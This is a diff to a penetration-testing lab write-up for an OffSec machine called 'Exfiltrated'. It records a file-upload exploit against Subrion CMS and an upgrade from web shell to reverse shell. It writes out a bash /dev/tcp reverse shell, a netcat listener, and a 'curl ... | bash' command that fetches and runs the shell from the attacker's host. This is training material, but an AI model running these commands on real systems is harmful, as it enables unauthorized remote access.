@@ -30,6 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Enumerated UDP ports:
 
 ```
+All 1000 scanned ports on exfiltrated.offsec (192.168.90.163) are in ignored states.
 ```
 
 Notes:
@@ -76,18 +77,44 @@ A simple Google search for Subrion Default Creds gives us this first site with l
 
 <figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
+## Exploitation
+
 ### 49876.py (Arbitrary File Upload)
 
 <figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 * Viewed the python exploit in gedit to ensure I was using the proper syntax!
 * I also had to copy/paste the explicit directory from the URL bar to the terminal for it to get the correct path (side note)
+* However, this shell was really buggy so I ended up transferring a bash reverse shell to upgrade my shell
 
-## Exploitation
+### Upgrading Web Shell -> Reverse Shell
 
-### Name of the technique
+Create bash reverse shell (rev\_shell):
 
-This is the exploit
+```
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.49.90/1337 0>&1
+```
+
+Start Netcat listener:
+
+```
+nc -lnvp 1337
+```
+
+Start HTTP server on Kali:
+
+```
+python3 -m http.server 80
+```
+
+Transfer w/ curl:
+
+```
+curl 192.168.49.90/rev_shell | bash
+```
+
+<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
